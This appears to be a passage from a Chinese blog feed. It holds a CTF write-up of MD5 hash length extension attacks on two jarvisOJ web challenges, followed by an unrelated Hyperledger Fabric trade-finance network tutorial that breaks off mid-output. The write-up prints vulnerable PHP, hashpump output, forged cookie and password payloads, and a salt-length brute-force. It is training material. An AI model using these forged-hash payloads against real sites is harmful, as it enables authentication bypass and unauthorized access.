class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_COOKIE[<span class="string">"getmein"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode($username) === <span class="string">"admin"</span> &amp;&amp; urldecode($password) != <span class="string">"admin"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($COOKIE[<span class="string">"getmein"</span>] === md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"The flag is "</span>. $flag);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">"You are not an admin! LEAVE."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"sample-hash"</span>, md5($secret . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_COOKIE[<span class="string">"source"</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">"source"</span>, <span class="number">0</span>, time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">"source"</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">""</span>; <span class="comment">// This source code is outputted here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>熟悉的味道，要注意的是<code>$salt = %secret.&quot;admin&quot;</code>，长度为20：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$salt.string1 = $secret.urldecode(<span class="string">"admin"</span>.<span class="string">"admin"</span>)</span><br><span class="line">$string1 = <span class="string">"admin"</span>   <span class="comment">//urldecode($username) === "admin"</span></span><br><span class="line">md5($salt.string1) = <span class="string">"571580b26c65f306376d4f64e53cb5c7"</span> <span class="comment">//cookie中的sample-hash</span></span><br><span class="line">$string2 = <span class="string">"kangel"</span>  <span class="comment">//urldecode($password) != "admin"</span></span><br></pre></td></tr></table></figure><p>现在利用hashpump计算<code>md5($secret.urldecode(&quot;admin&quot;.&quot;admin&quot;).padding.&quot;kangel&quot;)</code>，其中<code>$password=&quot;admin&quot;.padding.&quot;kangel&quot;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input Signature: 571580b26c65f306376d4f64e53cb5c7</span><br><span class="line">Input Data: admin</span><br><span class="line">Input Key Length: 20</span><br><span class="line">Input Data to Add: kangel</span><br><span class="line">04dd497abe8ae2d3c5a7775c2056850e</span><br><span class="line">admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00kangel</span><br></pre></td></tr></table></figure><p>于是构造cookie：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getmein=04dd497abe8ae2d3c5a7775c2056850e</span><br></pre></td></tr></table></figure><p>构造post，需要将<code>\x</code>替换为<code>%</code>:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=admin</span><br><span class="line">password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00kangel</span><br></pre></td></tr></table></figure><p>flag：CTF{cOOkieS_4nd_hAshIng_G0_w3LL_t0g3ther}</p><p><img alt="" data-src="/2019/04/05/hash-attack/4.JPG" class="lazyload"></p><h3 id="题目二：salt长度未知"><a href="#题目二：salt长度未知" class="headerlink" title="题目二：salt长度未知"></a>题目二：salt长度未知</h3><p>题目链接：<a href="http://web.jarvisoj.com:32778/" target="_blank" rel="noopener">http://web.jarvisoj.com:32778/</a></p><p>查看源码，无提示。</p><p>抓包分析，发现cookie中包含信息：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span>: UM_distinctid=167a58b007e9-03c00e05130083-143d7240-100200-167a58b007f190; role=s%3A5%3A%22guest%22%3B; hsh=3a4727d57463f122833d9e732f94e4e0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure><p>既然无任何源码信息，用源码泄露工具扫一波，发现：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://web.jarvisoj.com:32778/index.php~</span></span><br></pre></td></tr></table></figure><p>漏洞朔源：一般网站管理员在日常维护中，总会把网站源码给备份一下，防止网站出现问题时，能马上的恢复使用，不过一般的管理员安全意识不高，在备份的时候，会使用一些常见的压缩备份名以及文件名，而且不光使用常见的备份名字，大部分的管理还会把备份好的源码直接放在网站根目录里。因此很容易被攻击者利用。</p><p>该文件为index.php备份文件，先将文件名该文index.php.swp，再使用vim进行恢复</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -r index.php.swp</span><br></pre></td></tr></table></figure><p>得到源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Web 350<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    body &#123;</span></span><br><span class="line"><span class="undefined">        background:gray;</span></span><br><span class="line"><span class="undefined">        text-align:center;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">        $auth = <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">        $role = <span class="string">"guest"</span>;</span></span><br><span class="line"><span class="php">        $salt = </span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"role"</span>])) &#123;</span></span><br><span class="line"><span class="php">            $role = unserialize($_COOKIE[<span class="string">"role"</span>]);</span></span><br><span class="line"><span class="php">            $hsh = $_COOKIE[<span class="string">"hsh"</span>];</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> ($role===<span class="string">"admin"</span> &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[<span class="string">"role"</span>]))) &#123;</span></span><br><span class="line"><span class="php">                $auth = <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">                $auth = <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">            $s = serialize($role);</span></span><br><span class="line"><span class="php">            setcookie(<span class="string">'role'</span>,$s);</span></span><br><span class="line"><span class="php">            $hsh = md5($salt.strrev($s));</span></span><br><span class="line"><span class="php">            setcookie(<span class="string">'hsh'</span>,$hsh);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> ($auth) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin. Your flag is </span></span></span><br><span class="line"><span class="php">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    <span class="meta">?&gt;</span></span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>熟悉的味道，首先要满足<code>$role===&quot;admin&quot;</code>，对“admin”进行序列化得到<code>;&quot;nimda&quot;:5:s</code>，而字节填充和strrev()刚好利用unserialize()的%00截断漏洞：</p><p>漏洞分析：</p><p><img alt="" data-src="/2019/04/05/hash-attack/6.JPG" class="lazyload"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$salt = $salt   <span class="comment">//长度未知</span></span><br><span class="line">$string1 = strrev(serialize($role)) = ;<span class="string">"tseug"</span>:<span class="number">5</span>:s</span><br><span class="line">md5($salt.string1) = “<span class="number">3</span>a4727d57463f122833d9e732f94e4e0”  <span class="comment">//cookie中的hsh </span></span><br><span class="line">$string2 = ;<span class="string">"nimda"</span>:<span class="number">5</span>:s</span><br></pre></td></tr></table></figure><p>现在用hashpump计算<code>md5($salt.strrev($_COOKIE[&quot;role&quot;]))</code>，salt长度对hash值计算无影响，假设为10</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input Signature: 3a4727d57463f122833d9e732f94e4e0</span><br><span class="line">Input Data: ;<span class="string">"tseug"</span>:5:s</span><br><span class="line">Input Key Length: 10</span><br><span class="line">Input Data to Add: ;<span class="string">"nimda"</span>:5:s</span><br><span class="line">fcdc3840332555511c4e4323f6decb07</span><br><span class="line">;<span class="string">"tseug"</span>:5:s\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb0\x00\x00\x00\x00\x00\x00\x00;<span class="string">"nimda"</span>:5:s</span><br></pre></td></tr></table></figure><p>得到cookie中的hsh：<code>fcdc3840332555511c4e4323f6decb07</code>，对padding值进行反转，将<code>\x</code>替换为<code>%</code>，进行URL编码：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">role=s%3a5%3a"admin"%3b%00%00%00%00%00%00%00%b0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80s%3a5%3a"guest"%3b</span><br></pre></td></tr></table></figure><p>利用burp进行爆破，最多64次，这里取salt长度为10,11,12,13,14,15作为演示，选取<code>%b0%00%00%00%00%00</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%b0%00%00%00%00%00</span><br><span class="line">%b8%00%00%00%00</span><br><span class="line">%c0%00%00%00</span><br><span class="line">%c8%00%00</span><br><span class="line">%d0%00</span><br><span class="line">%d8</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/2019/04/05/hash-attack/5.JPG" class="lazyload"></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> jarvisOJ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
            <tag> web </tag>
            
            <tag> MD5 </tag>
            
            <tag> 源码泄露 </tag>
            
            <tag> 序列化 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>trade-finance-logistics网络运行与分析</title>
      <link href="/2019/03/28/trade-finance/"/>
      <url>/2019/03/28/trade-finance/</url>
      
        <content type="html"><![CDATA[<h3 id="一、trade-finance-logistics网络介绍"><a href="#一、trade-finance-logistics网络介绍" class="headerlink" title="一、trade-finance-logistics网络介绍"></a>一、trade-finance-logistics网络介绍</h3><h4 id="1、工作交易流程"><a href="#1、工作交易流程" class="headerlink" title="1、工作交易流程"></a>1、工作交易流程</h4><p>工作流程中的交易如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1. 进口商要求出口商提供货物以换取货币</span><br><span class="line">2. 出口商接受贸易协议</span><br><span class="line">3. 进口商要求银行提供有利于出口商的信用证</span><br><span class="line">4. 进口商的银行提供有利于出口商的信用证，并可支付给后者的银行</span><br><span class="line">5. 出口商的银行代表出口商接受信用证</span><br><span class="line">6. 出口商向监管机构申请E / L.</span><br><span class="line">7. 监管机构向出口商提供E / L.</span><br><span class="line">8. 出口商准备一批货物并将其交给承运人</span><br><span class="line">9. 承运人在确认E / L后接受货物，然后向出口商提供提单</span><br><span class="line">10. 出口商的银行要求进口商银行支付一半的款项</span><br><span class="line">11. 进口商的银行将一半的金额转移到出口商的银行</span><br><span class="line">12. 承运人将货物运至目的地</span><br><span class="line">13. 进口商的银行向出口商的银行支付剩余金额</span><br></pre></td></tr></table></figure><p>这是一个解释交易工作流程的图表：</p><p><img alt="" data-src="/2019/03/28/trade-finance/1.png" class="lazyload"></p><h4 id="2、构建fabric网络"><a href="#2、构建fabric网络" class="headerlink" title="2、构建fabric网络"></a>2、构建fabric网络</h4><p>样本贸易网络将由四个组织组成，分别代表出口商，进口商，承运商和监管机构。后两者分别代表运营商和监管机构实体。但是，出口组织既代表出口实体又代表其银行。同样，进口商组织代表进口实体及其银行。如下图所示：</p><p><img alt="" data-src="/2019/03/28/trade-finance/2.png" class="lazyload"></p><h3 id="二、环境准备"><a href="#二、环境准备" class="headerlink" title="二、环境准备"></a>二、环境准备</h3><h4 id="1、hyperledger-fabric环境搭建"><a href="#1、hyperledger-fabric环境搭建" class="headerlink" title="1、hyperledger fabric环境搭建"></a>1、hyperledger fabric环境搭建</h4><p>具体过程见<a href="https://j-kangel.github.io/2019/03/24/hyperledger/">https://j-kangel.github.io/2019/03/24/hyperledger/</a></p><h4 id="2、trade-finance-logistics网络的下载"><a href="#2、trade-finance-logistics网络的下载" class="headerlink" title="2、trade-finance-logistics网络的下载"></a>2、trade-finance-logistics网络的下载</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> <span class="variable">$GOPATH</span>/src  </span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/HyperledgerHandsOn/trade-finance-logistics.git</span><br></pre></td></tr></table></figure><h4 id="3、设置cryptogen环境变量"><a href="#3、设置cryptogen环境变量" class="headerlink" title="3、设置cryptogen环境变量"></a>3、设置cryptogen环境变量</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:~/go/src/github.com/hyperledger/fabric/fabric-samples/bin</span><br><span class="line">$ cryptogen version   <span class="comment">#测试是否生效</span></span><br><span class="line">cryptogen:</span><br><span class="line"> Version: 1.4.0</span><br><span class="line"> Commit SHA: d700b43</span><br><span class="line"> Go version: go1.11.1</span><br><span class="line"> OS/Arch: linux/amd64</span><br></pre></td></tr></table></figure><h4 id="4、更改配置文件configtx-yaml"><a href="#4、更改配置文件configtx-yaml" class="headerlink" title="4、更改配置文件configtx.yaml"></a>4、更改配置文件configtx.yaml</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> go/src/trade-finance-logistics/network</span><br><span class="line">$ gedit configtx.yaml</span><br></pre></td></tr></table></figure><p>将以下内容移至文件末尾，这是因为hyperledger fabric1.4更新的语法规则</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Profiles:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">    FourOrgsTradeOrdererGenesis:</span></span><br><span class="line"><span class="attr">        Capabilities:</span></span><br><span class="line">            <span class="string">&lt;&lt;:</span> <span class="meta">*ChannelCapabilities</span></span><br><span class="line"><span class="attr">        Orderer:</span></span><br><span class="line">            <span class="string">&lt;&lt;:</span> <span class="meta">*OrdererDefaults</span></span><br><span class="line"><span class="attr">            Organizations:</span></span><br><span class="line"><span class="bullet">                -</span> <span class="meta">*TradeOrdererOrg</span></span><br><span class="line"><span class="attr">            Capabilities:</span></span><br><span class="line">                <span class="string">&lt;&lt;:</span> <span class="meta">*OrdererCapabilities</span></span><br><span class="line"><span class="attr">        Consortiums:</span></span><br><span class="line"><span class="attr">            TradeConsortium:</span></span><br><span class="line"><span class="attr">                Organizations:</span></span><br><span class="line"><span class="bullet">                    -</span> <span class="meta">*ExporterOrg</span></span><br><span class="line"><span class="bullet">                    -</span> <span class="meta">*ImporterOrg</span></span><br><span class="line"><span class="bullet">                    -</span> <span class="meta">*CarrierOrg</span></span><br><span class="line"><span class="bullet">                    -</span> <span class="meta">*RegulatorOrg</span></span><br><span class="line"><span class="attr">    FourOrgsTradeChannel:</span></span><br><span class="line"><span class="attr">        Consortium:</span> <span class="string">TradeConsortium</span></span><br><span class="line"><span class="attr">        Application:</span></span><br><span class="line">            <span class="string">&lt;&lt;:</span> <span class="meta">*ApplicationDefaults</span></span><br><span class="line"><span class="attr">            Organizations:</span></span><br><span class="line"><span class="bullet">                -</span> <span class="meta">*ExporterOrg</span></span><br><span class="line"><span class="bullet">                -</span> <span class="meta">*ImporterOrg</span></span><br><span class="line"><span class="bullet">                -</span> <span class="meta">*CarrierOrg</span></span><br><span class="line"><span class="bullet">                -</span> <span class="meta">*RegulatorOrg</span></span><br><span class="line"><span class="attr">            Capabilities:</span></span><br><span class="line">                <span class="string">&lt;&lt;:</span> <span class="meta">*ApplicationCapabilities</span></span><br></pre></td></tr></table></figure><h3 id="三、创建channel并运行网络"><a href="#三、创建channel并运行网络" class="headerlink" title="三、创建channel并运行网络"></a>三、创建channel并运行网络</h3><h4 id="1、创建通道channel"><a href="#1、创建通道channel" class="headerlink" title="1、创建通道channel"></a>1、创建通道channel</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> go/src/trade-finance-logistics/network</span><br><span class="line">$ ./trade.sh generate -c tradechannel</span><br></pre></td></tr></table></figure><p>此时会创建一个排序节点（orderer）和四个对等锚节点（ImporterOrg、ExporterOrg、RegulatorOrg、CarrierOrg），并生成相应的配置文件，稍后详细分析。</p><h4 id="2、启动网络"><a href="#2、启动网络" class="headerlink" title="2、启动网络"></a>2、启动网络</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./trade.sh up -c tradechannel</span><br></pre></td></tr></table></figure><p>启动成功后显示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Starting with channel <span class="string">'tradechannel'</span></span><br><span class="line">Continue? [Y/n] </span><br><span class="line">proceeding ...</span><br><span class="line">LOCAL_VERSION=1.4.0</span><br><span class="line">DOCKER_IMAGE_VERSION=1.4.0</span><br></pre></td></tr></table></figure><h4 id="3、关闭网络"><a href="#3、关闭网络" class="headerlink" title="3、关闭网络"></a>3、关闭网络</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./trade.sh down -c tradechannel</span><br></pre></td></tr></table></figure><p>关闭成功后显示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Stopping ca_peerImporterOrg           ... <span class="keyword">done</span>    <span class="comment">#停止进口商节点证书</span></span><br><span class="line">Stopping ca_peerRegulatorOrg          ... <span class="keyword">done</span></span><br><span class="line">Stopping ca_peerExporterOrg           ... <span class="keyword">done</span></span><br><span class="line">Stopping ca_peerCarrierOrg            ... <span class="keyword">done</span></span><br><span class="line">Stopping peer0.importerorg.trade.com  ... <span class="keyword">done</span>    <span class="comment">#停止进口商节点</span></span><br><span class="line">Stopping peer0.carrierorg.trade.com   ... <span class="keyword">done</span></span><br><span class="line">Stopping peer0.regulatororg.trade.com ... <span class="keyword">done</span></span><br><span class="line">Stopping orderer.trade.com            ... <span class="keyword">done</span></span><br><span class="line">Stopping peer0.exporterorg.trade.com  ... <span class="keyword">done</span></span><br><span class="line">Removing ca_peerImporterOrg           ... <span class="keyword">done</span>    <span class="comment">#移除进口商节点证书</span></span><br><span class="line">Removing ca_peerRegulatorOrg          ... <span class="keyword">done</span></span><br><span class="line">Removing ca_peerExporterOrg           ... <span class="keyword">done</span></span><br><span class="line">Removing ca_peerCarrierOrg            ... <span class="keyword">done</span></span><br><span class="line">Removing peer0.importerorg.trade.com  ... <span class="keyword">done</span>    <span class="comment">#移除进口商节点</span></span><br><span class="line">Removing peer0.carrierorg.trade.com   ... <span class="keyword">done</span></span><br><span class="line">Removing peer0.regulatororg.trade.com ... <span class="keyword">done</span></span><br><span class="line">Removing orderer.trade.com            ... <span class="keyword">done</span></span><br><span class="line">Removing peer0.exporterorg.trade.com  ... <span class="keyword">done</span></span><br><span class="line">Removing network net_trade</span><br><span class="line">Removing volume net_orderer.trade.com</span><br><span class="line">Removing volume net_peer0.exporterorg.trade.com</span><br><span class="line">Removing volume net_peer0.importerorg.trade.com</span><br><span class="line">Removing volume net_peer0.regulatororg.trade.com</span><br><span class="line">Removing volume net_peer0.carrierorg.trade.com</span><br></pre></td></tr></table></figure><h3 id="四、生成通道文件分析"><a href="#四、生成通道文件分析" class="headerlink" title="四、生成通道文件分析"></a>四、生成通道文件分析</h3><h4 id="1、网络加密材料配置文件crypto-config-yaml剖析"><a href="#1、网络加密材料配置文件crypto-config-yaml剖析" class="headerlink" title="1、网络加密材料配置文件crypto-config.yaml剖析"></a>1、网络加密材料配置文件crypto-config.yaml剖析</h4><p>该网络包含一个排序组织和四个对等节点组织，具体关系如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># "OrdererOrgs" - Definition of organizations managing orderer nodes</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="attr">OrdererOrgs:</span>  <span class="comment">##管理orderer节点的组织的定义</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">TradeOrderer</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># "PeerOrgs" - Definition of organizations managing peer nodes</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="attr">PeerOrgs:</span>    <span class="comment">##管理Peer节点的组织的定义</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">ExporterOrg</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">ImporterOrg</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">CarrierOrg</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">RegulatorOrg</span></span><br></pre></td></tr></table></figure><p>每个组织都有各自的属性，下面以ImporterOrg为例</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ImporterOrg</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="attr">- Name:</span> <span class="string">ImporterOrg</span>     <span class="comment">##组织名称</span></span><br><span class="line"><span class="attr">  Domain:</span> <span class="string">importerorg.trade.com</span>   <span class="comment">##组织域名</span></span><br><span class="line"><span class="attr">  EnableNodeOUs:</span> <span class="literal">true</span>             <span class="comment">##如果设置了EnableNodeOUs，就在msp下生成config.yaml文件</span></span><br><span class="line"><span class="attr">  Template:</span></span><br><span class="line"><span class="attr">    Count:</span> <span class="number">1</span>            <span class="comment">##表示生成一个peer</span></span><br><span class="line"><span class="attr">  Users:</span></span><br><span class="line"><span class="attr">    Count:</span> <span class="number">2</span>            <span class="comment">##表示生成两个普通用户</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure><h4 id="2、生成所有组织加密材料"><a href="#2、生成所有组织加密材料" class="headerlink" title="2、生成所有组织加密材料"></a>2、生成所有组织加密材料</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cryptogen generate --config=./crypto-config.yaml  <span class="comment">##./trade.sh generate第一部分</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ tree -L 2 crypto-config   <span class="comment">##查看crypto-config的二级目录</span></span><br><span class="line">crypto-config</span><br><span class="line">├── ordererOrganizations    <span class="comment">##order组织只有一个</span></span><br><span class="line">│   └── trade.com</span><br><span class="line">└── peerOrganizations       <span class="comment">##peer组织有四个</span></span><br><span class="line">    ├── carrierorg.trade.com</span><br><span class="line">    ├── exporterorg.trade.com</span><br><span class="line">    ├── importerorg.trade.com</span><br><span class="line">    └── 